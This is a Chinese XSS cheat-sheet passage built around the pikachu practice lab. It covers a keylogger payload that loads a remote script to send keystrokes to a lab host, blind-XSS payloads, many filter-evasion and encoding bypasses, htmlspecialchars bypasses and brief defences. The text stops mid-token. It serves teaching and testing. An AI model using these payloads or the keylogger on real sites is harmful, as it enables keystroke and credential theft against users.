src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录结果展示.png" alt="键盘记录结果展示"></center><p><strong>注</strong>：</p><ul><li><strong>跨域操作</strong>：当协议、主机(主域名，子域名)、端口中的任意一个不相同时，称为不同域。我们把不同的域之间请求数据的操作，成为跨域操作。</li><li><strong>同源策略</strong>：为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本既不同域之间不能使用JS进行操作。比如：<code>x.com</code>域名下的js不能操作y.com域名下的对象。那么为什么要有同源策略？ 比如一个恶意网站的页面通过js嵌入了银行的登录页面（二者不同源），如果没有同源限制，恶意网页上的javascript脚本就可以在用户登录银行的时候获取用户名和密码。</li></ul><p><strong>Tips</strong>:下面这些标签跨域加载资源(资源类型是有限止的)是不受同源策略限制的</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//加载本地js执行</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//图片</span><span class="token operator">&lt;</span>link href<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//css</span><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"..."</span><span class="token operator">></span>  <span class="token comment" spellcheck="true">//任意资源</span></code></pre><ul><li><p><strong>同源策略修改</strong>:<br><code>D:\phpStudy\WWW\pikachu\pkxss\rkeypress\rkserver.php</code><br>   同之前的案例到后台设置好<code>Access-Control-Allow-Origin</code>，设置为<code>*</code>，既允许所有人访问。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/键盘记录设置跨域访问.png" alt="键盘记录设置跨域访问"></center></li><li><p><strong>rk.js关键代码解读</strong>:</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> realkey <span class="token operator">=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span>keyCode<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//获取用户键盘记录，最后转化为字符串</span>xl<span class="token operator">+</span><span class="token operator">=</span>realkey<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//赋值给x1</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//调用show涵数，通过下面ajax进行post发送键盘记录人内容</span></code></pre></li><li><p><strong>payload</strong>:</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.19.136:8080/pkxss/rkeypress/rk.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre></li></ul><h2 id="XSS盲打"><a href="#XSS盲打" class="headerlink" title="XSS盲打"></a>XSS盲打</h2><p>​        XSS盲打就是攻击者在前端提交的数据不知道后台是否存在xss漏洞的情况下，提交恶意JS代码在类似留言板等输入框后，所展现的后台位置的情况下，网站采用了攻击者插入的恶意代码，当后台管理员在操作时就会触发插入的恶意代码，从而达到攻击者的目的。</p><ol><li><p><strong>payload</strong>：</p><pre class=" language-javascript"><code class="language-javascript">'"<span class="token operator">></span><span class="token operator">&lt;</span>sCrIpT<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">63252</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>sCrIpT<span class="token operator">></span></code></pre></li><li><p>在留言中输入payload。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS盲打提交payload.png" alt="XSS盲打提交payload"></center></li><li><p>管理员进入后台时的登录界面。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS盲打管理员登录界面.png" alt="XSS盲打管理员登录界面"></center></li><li><p>进入后台时触发脚本。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/CheatSheet/XSS盲打触发脚本.png" alt="XSS盲打触发脚本"></center></li></ol><h1 id="XSS构造"><a href="#XSS构造" class="headerlink" title="XSS构造"></a>XSS构造</h1><ol><li><p>利用<code>&lt;&gt;</code>标记注射HTML、JavaScript</p><p>通过<code>&lt;script&gt;</code>标签就能任意插入由JavaScript或VBScript编写的恶意脚本代码</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre></li><li><p>利用HTML标签属性值执行XSS</p><p>通过<code>javascript:[code]</code>伪协议形式编写恶意脚本</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>table background<span class="token operator">=</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>table<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss')"</span><span class="token operator">></span></code></pre></li><li><p>空格、回车、<code>Tab</code>绕过过滤</p><p>由于在编译时JavaScript语句通常以分号结尾，如果JavaScript引擎确定一个语句是完整的，而这一行的结尾有换行符，那么就可以省略分号；否则JavaScript会继续处理发现的内容，直到遇到一个分号或发现语句完整为止。</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// Tab键</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"java    script:alert('xss')"</span><span class="token operator">></span>            <span class="token comment" spellcheck="true">// 回车</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>"javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span>"<span class="token operator">></span></code></pre></li><li><p>对标签属性值进行转码</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:slert('xss');"</span><span class="token operator">></span>替换成：<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascrip&amp;#116&amp;#58slert('xss');"</span><span class="token operator">></span>其中，t的ASCII码值为<span class="token number">116</span>，<span class="token punctuation">:</span>的ASCII码值为<span class="token number">58</span>再进一步替换：<span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascrip&amp;#0000116&amp;#0000058slert('xss');"</span><span class="token operator">></span></code></pre></li><li><p>产生事件如<code>click</code>、<code>mouseover</code>、<code>load</code>等</p><p>W3C将事件分为3种不同的类型：</p><ul><li>用户接口（鼠标、键盘）</li><li>逻辑（处理的结果）</li><li>变化（对文档进行修改）</li></ul><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string">"button"</span> value<span class="token operator">=</span><span class="token string">"Click Me"</span> onclick<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">/</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span></code></pre></li><li><p>利用CSS跨站过滤</p><p>常见案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"background-image:url(javascript:alert('xss'))"</span><span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span>body <span class="token punctuation">{</span>background<span class="token operator">-</span>image<span class="token punctuation">:</span><span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"javascript:alert(/xss/)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"width:expression(alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"#"</span> style<span class="token operator">=</span><span class="token string">"xss:expression(alert(/xss/));"</span><span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span>body <span class="token punctuation">{</span>background<span class="token operator">-</span>image<span class="token punctuation">:</span> <span class="token function">expression</span><span class="token punctuation">(</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"xss"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"list-style-image:url(javascript:alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"background-image:url(javascript:alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">" javascript:alert('xss')"</span><span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span>    @<span class="token keyword">import</span> <span class="token string">'javascript:alert(/xss/)'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span></code></pre></li><li><p>扰乱XSS过滤规则</p><p>常见案例：</p><pre class=" language-javascript"><code class="language-javascript">一个正常的XSS输入<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert(0);"</span><span class="token operator">></span>转换大小写后的XSS<span class="token punctuation">:</span><span class="token operator">&lt;</span>IMG SRC<span class="token operator">=</span><span class="token string">"javascript:alert(0);"</span><span class="token operator">></span>大小写混淆的XSS：<span class="token operator">&lt;</span>iMg sRC<span class="token operator">=</span><span class="token string">"JaVasCript:alert(0);"</span><span class="token operator">></span>不用双引号，而是使用单引号的XSS<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">'javascript:alert(0);'</span><span class="token operator">></span>不适用引号的XSS：<span class="token operator">&lt;</span>img src<span class="token operator">=</span>javascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span>不需要空格的XSS<span class="token punctuation">:</span><span class="token operator">&lt;</span>img<span class="token operator">/</span>src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span>构造不同的全角字符<span class="token punctuation">:</span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"{left:ｅｘｐｒｅｓｓｉｏｎ(alert('xss'))"</span><span class="token operator">></span>利用注释符<span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"wid/**/th:expre/*xss*/ssion(alert('xss'));"</span><span class="token operator">></span>\和\<span class="token number">0</span>–<span class="token operator">&lt;</span>style<span class="token operator">></span>@imp\0ort <span class="token string">'java\0scri\pt:alert(/xss/)'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span>@imp\ort <span class="token string">'ja\0va\00sc\000ri\0000pt:alert(/xss/)'</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span>CSS关键字转码<span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"xss:\65xpression(alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"xss:\065xpression(alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">"xss:\0065xpression(alert('XSS'));"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"-->&lt;img src=x onerror=alert(1)//"</span><span class="token operator">></span><span class="token operator">&lt;</span>comment<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"&lt;/comment>&lt;img src=x onerror=alert(1)//"</span><span class="token operator">></span><span class="token operator">&lt;</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>“<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">></span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//”></span></code></pre></li><li><p>利用字符编码</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript">原始语句<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token string">"javascript:alert('xss');"</span><span class="token operator">></span>十进制编码<span class="token operator">&lt;</span>imgsrc<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">106</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token operator">&amp;</span>#<span class="token number">118</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token operator">&amp;</span>#<span class="token number">99</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token operator">&amp;</span>#<span class="token number">105</span><span class="token operator">&amp;</span>#<span class="token number">112</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token operator">&amp;</span>#<span class="token number">58</span><span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token operator">&amp;</span>#<span class="token number">108</span><span class="token operator">&amp;</span>#<span class="token number">101</span><span class="token operator">&amp;</span>#<span class="token number">114</span><span class="token operator">&amp;</span>#<span class="token number">116</span><span class="token operator">&amp;</span>#<span class="token number">40</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token operator">&amp;</span>#<span class="token number">120</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token operator">&amp;</span>#<span class="token number">115</span><span class="token operator">&amp;</span>#<span class="token number">39</span><span class="token operator">&amp;</span>#<span class="token number">41</span><span class="token operator">&amp;</span>#<span class="token number">59</span>"<span class="token operator">></span><span class="token operator">&lt;</span>imgsrc<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">0106</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">097</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0118</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">097</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">099</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0105</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0112</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">058</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">097</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0108</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0101</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0114</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0116</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">040</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">039</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0120</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">0115</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">039</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">041</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">059</span><span class="token punctuation">;</span>"<span class="token operator">></span><span class="token operator">&lt;</span>imgsrc<span class="token operator">=</span>"<span class="token operator">&amp;</span>#<span class="token number">0000106</span><span class="token operator">&amp;</span>#<span class="token number">000097</span><span class="token operator">&amp;</span>#<span class="token number">0000118</span><span class="token operator">&amp;</span>#<span class="token number">000097</span><span class="token operator">&amp;</span>#<span class="token number">0000115</span><span class="token operator">&amp;</span>#<span class="token number">000099</span><span class="token operator">&amp;</span>#<span class="token number">000011</span><span class="token number">4</span><span class="token operator">&amp;</span>#<span class="token number">0000105</span><span class="token operator">&amp;</span>#<span class="token number">0000112</span><span class="token operator">&amp;</span>#<span class="token number">0000116</span><span class="token operator">&amp;</span>#<span class="token number">000058</span><span class="token operator">&amp;</span>#<span class="token number">000097</span><span class="token operator">&amp;</span>#<span class="token number">0000108</span><span class="token operator">&amp;</span>#<span class="token number">0000101</span><span class="token operator">&amp;</span>#<span class="token number">0000114</span><span class="token operator">&amp;</span>#<span class="token number">0000116</span><span class="token operator">&amp;</span>#<span class="token number">000040</span><span class="token operator">&amp;</span>#<span class="token number">000039</span><span class="token operator">&amp;</span>#<span class="token number">0000120</span><span class="token operator">&amp;</span>#<span class="token number">0000115</span><span class="token operator">&amp;</span>#<span class="token number">0000115</span><span class="token operator">&amp;</span>#<span class="token number">00</span><span class="token number">0039</span><span class="token operator">&amp;</span>#<span class="token number">000041</span><span class="token operator">&amp;</span>#<span class="token number">000059</span>"<span class="token operator">></span>十六进制编码<span class="token operator">&lt;</span>imgsrc<span class="token operator">=</span>"<span class="token operator">&amp;</span>#x6a<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x76<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x63<span class="token operator">&amp;</span>#x72<span class="token operator">&amp;</span>#x69<span class="token operator">&amp;</span>#x70<span class="token operator">&amp;</span>#x74<span class="token operator">&amp;</span>#x3a<span class="token operator">&amp;</span>#x61<span class="token operator">&amp;</span>#x6c<span class="token operator">&amp;</span>#x65<span class="token operator">&amp;</span>#x72<span class="token operator">&amp;</span>#x74<span class="token operator">&amp;</span>#x28<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x78<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x73<span class="token operator">&amp;</span>#x27<span class="token operator">&amp;</span>#x29<span class="token operator">&amp;</span>#x3b"<span class="token operator">></span></code></pre></li><li><p>利用字符编码<code>eval()</code>函数、<code>eval()</code>函数和<code>string.fromCharCode()</code>函数过滤</p><p>常用案例：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>imgsrc<span class="token operator">=</span>"javascript<span class="token punctuation">:</span><span class="token function">eval</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">116</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">39</span><span class="token punctuation">,</span><span class="token number">120</span></code></pre></li></ol><h1 id="XSS绕过"><a href="#XSS绕过" class="headerlink" title="XSS绕过"></a>XSS绕过</h1><p>​        大多数网站为了避免xss的攻击，对于攻击者的输入都采取了过滤的措施，导致攻击者通常不能正常插入恶意代码来达到攻击目的。但是仍存在一些漏洞可以利用，来绕过过滤措施。</p><p>​        xss绕过的方法有许多，主要取决于攻击者的思路和对前端技术的掌握，以下介绍几个简单的绕过方法。</p><p>（1）对前端的限制可以尝试进行<strong>抓包重发</strong>或者<strong>修改前端的HTML</strong>。<br>（2）防止后台对输入的内容进行<strong>正则匹配来过滤输入</strong>，对于这样的过滤可以考虑大小写混合输入的方法。<br>     例：<code>&lt;sCRipT&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/sCrIPt&gt;</code><br>（3）防止后台对输入的内容进行替换，采用拼拼凑的输入方法。<br>     例：<code>&lt;sc&lt;script&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;script&gt;ipt&gt;</code><br>（4）使用<strong>注释</strong>来干扰后台对输入内容的识别。<br>     例：<code>&lt;sc&lt;!--test--&gt;ript&gt;alert(&#39;你打篮球像oldboy&#39;)&lt;/scr&lt;!--tshauie--&gt;ipt&gt;</code><br>（5）<strong>编码</strong>：后台有可能会对代码中的关键字进行过滤，但我们可以尝试将关键字进行编码后在插入，浏览器对改编码进行识别时，会翻译成正常的代码。（注意：编码在输出时是否会被正常识别和翻译才是关键，<font color="blue">不是所有的编码都是可以的</font>）</p><p>​    例：使用事件属性<code>onerror(): &lt;img src=# onerror=&quot;alert(&#39;oldboy&#39;)&quot;/&gt;</code></p><p>使用HTML进行编码：<code>&lt;img src=x onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#121;&amp;#97;&amp;#110;&amp;#103;&amp;#115;&amp;#104;&amp;#117;&amp;#97;&amp;#110;&amp;#103;&amp;#39;&amp;#41;&quot;/&gt;</code></p><h2 id="XSS绕过之htmlspecialchars-函数"><a href="#XSS绕过之htmlspecialchars-函数" class="headerlink" title="XSS绕过之htmlspecialchars()函数"></a>XSS绕过之htmlspecialchars()函数</h2><p>​        htmlspecialchars()函数把一些预定义的字符转换为 HTML 实体。</p><p><strong>预定义的字符是</strong>：</p><ul><li><code>&amp; (</code>和号)成为<code>&amp;amp</code></li><li><code>&quot;</code> (双引号)成为 <code>&amp;quot</code></li><li><code>’</code>(单引号)成为<code>&amp;#039</code></li><li><code>&lt;</code> (小于)成为 <code>&amp;lt</code></li><li><code>&gt;</code>(大于)成为 <code>&amp;g</code></li></ul><p><strong>该函数的语法</strong>：</p><p>​    htmlspecialchars(string,flags,character-set,double_encode)</p><p><strong>过滤原理</strong>：htmlspecialchars() 函数把预定义的字符转换为 HTML 实体，从而使XSS攻击失效。但是这个函数默认配置不会将单引号和双引号过滤，只有设置了quotestyle规定如何编码单引号和双引号才能会过滤掉单引号</p><p><strong>可用的quotestyle类型</strong>：<br>ENT_COMPAT - 默认。仅编码双引号<br>ENT_QUOTES - 编码双引号和单引号<br>ENT_NOQUOTES - 不编码任何引号</p><p>可使用以下语句绕过：  q’ onclick=’alert(111)’</p><h2 id="xss之href输出绕过"><a href="#xss之href输出绕过" class="headerlink" title="xss之href输出绕过"></a>xss之href输出绕过</h2><p>​        javascript:alert(1111) 直接代入a标签herf里面一样可以绕过htmlspecialchars</p><h2 id="xss之js输出绕过"><a href="#xss之js输出绕过" class="headerlink" title="xss之js输出绕过"></a>xss之js输出绕过</h2><pre class=" language-javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    $ms<span class="token operator">=</span><span class="token string">'11'</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1111</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span> <span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>$ms<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>$ms <span class="token operator">==</span> <span class="token string">'tmac'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'tmac确实厉害,看那小眼神..'</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//            alert($ms);</span>            <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#fromjs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token string">'无论如何不要放弃心中所爱..'</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><h1 id="XSS常规防范"><a href="#XSS常规防范" class="headerlink" title="XSS常规防范"></a>XSS常规防范</h1><p>​        由于XSS通常可以插入在script标签、HTML注释、标签属性名、标签属性值、标签名字、CSS等中，所以接下来我们简单讲讲如何防御XSS攻击。  </p><h2 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h2><p>​        输入验证就是对用户提交的信息进行有效验证，仅接受<strong>指定长度范围内</strong>的，采用<strong>适当的内容</strong>提交，阻止或者忽略除此外的其他任何数据。  </p><p>输入验证要根据实际情况设计，下面是一些常见的检测和过滤：</p><ul><li>输入是否仅仅包含合法的字符</li><li>输入字符串是否超过最大长度限制</li><li>输入如果为数字，数字是否在指定的范围</li><li>输入是否符合特殊的格式要求，如E-mail地址、IP地址等</li></ul><h2 id="输出编码"><a href="#输出编码" class="headerlink" title="输出编码"></a>输出编码</h2><p>​        大多数的Web应用程序都存在一个通病，就是会把用户输入的信息完完整整的输出在页面中，这样很容易便会产生一个XSS。HTML编码在防止XSS攻击上起到很大的作用，它主要是用对应的HTML实体编号替代字面量字符，这样做可以确保浏览器安全处理可能存在恶意字符，将其当做HTMl文档的内容而非结构加以处理。</p><h2 id="黑白名单"><a href="#黑白名单" class="headerlink" title="黑白名单"></a>黑白名单</h2><p>有时根本就不需要考虑到它是不是HTML标签，我们根本用不到HTML标签。不管是采用输入过滤还是输出过滤，都是针对数据信息进行黑/白名单式的过滤。  </p><p>不同的javascript写法包括：  </p><pre class=" language-javascript"><code class="language-javascript">大小写混淆<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>JaVaScRiPt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token operator">></span>插入<span class="token punctuation">[</span>tab<span class="token punctuation">]</span>键；<span class="token operator">&lt;</span>img src<span class="token operator">=</span>”jav <span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>插入回车符<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>”javasrci<span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>使用<span class="token comment" spellcheck="true">/**/</span>注释符<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>”java<span class="token comment" spellcheck="true">/*xxx*/</span>script<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>重复混淆关键字<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>”java<span class="token comment" spellcheck="true">/*/*javascript*/</span>script<span class="token comment" spellcheck="true">/*javascript*/</span><span class="token operator">*</span><span class="token operator">/</span>script<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss使用<span class="token operator">&amp;</span>#十六进制编码字符<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>”jav<span class="token operator">&amp;</span>#x09<span class="token punctuation">;</span>ascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>使用<span class="token operator">&amp;</span>#十进制编码字符<span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span> jav<span class="token operator">&amp;</span>#<span class="token number">97</span><span class="token punctuation">;</span>script<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>使用<span class="token operator">&amp;</span>#<span class="token function">十进制编码字符</span><span class="token punctuation">(</span>加入大量的<span class="token number">0000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token operator">&lt;</span>img src<span class="token operator">=</span>”j<span class="token operator">&amp;</span>#<span class="token number">00097</span><span class="token punctuation">;</span>vascript<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>在开头插入空格：<span class="token operator">&lt;</span>img src<span class="token operator">=</span>” <span class="token function">alert</span><span class="token punctuation">(</span>‘xss’<span class="token punctuation">)</span><span class="token punctuation">;</span>”<span class="token operator">></span>ascript<span class="token 